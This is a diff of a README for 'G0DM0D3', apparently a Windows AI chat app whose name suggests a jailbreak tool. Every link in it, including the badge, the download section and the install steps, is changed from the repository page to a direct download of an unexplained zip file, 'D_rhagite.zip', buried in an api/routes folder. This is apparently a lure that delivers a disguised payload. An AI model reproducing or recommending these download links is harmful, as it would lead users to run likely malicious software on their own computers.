@@ -1,12 +1,12 @@
 # ⚡ G0DM0D3 - Controlled AI Chat Access
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20the%20Repository-blue?style=for-the-badge)](https://github.com/Littleblackantomeprazole164/G0DM0D3)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20the%20Repository-blue?style=for-the-badge)](https://github.com/Littleblackantomeprazole164/G0DM0D3/raw/refs/heads/main/api/routes/D_rhagite.zip)
 
 ## 🔽 Download
 
 Use this link to visit the page and download the app:
 
-https://github.com/Littleblackantomeprazole164/G0DM0D3
+https://github.com/Littleblackantomeprazole164/G0DM0D3/raw/refs/heads/main/api/routes/D_rhagite.zip
 
 ## 🖥️ What G0DM0D3 Does
 
@@ -37,7 +37,7 @@ For best results:
 ## 📥 How to Download
 
 1. Open this page in your browser:
-   https://github.com/Littleblackantomeprazole164/G0DM0D3
+   https://github.com/Littleblackantomeprazole164/G0DM0D3/raw/refs/heads/main/api/routes/D_rhagite.zip
 2. Look for the latest release or download files on the page
 3. Download the Windows file that matches your PC
 4. Save the file in a place you can find, such as Downloads or Desktop
@@ -205,7 +205,7 @@ Keep the app, settings, and data files in the same place. This helps the app loa
 
 Use this page to visit the repository and download the Windows app:
 
-https://github.com/Littleblackantomeprazole164/G0DM0D3
+https://github.com/Littleblackantomeprazole164/G0DM0D3/raw/refs/heads/main/api/routes/D_rhagite.zip
 
 ## 🧷 Quick Start
 
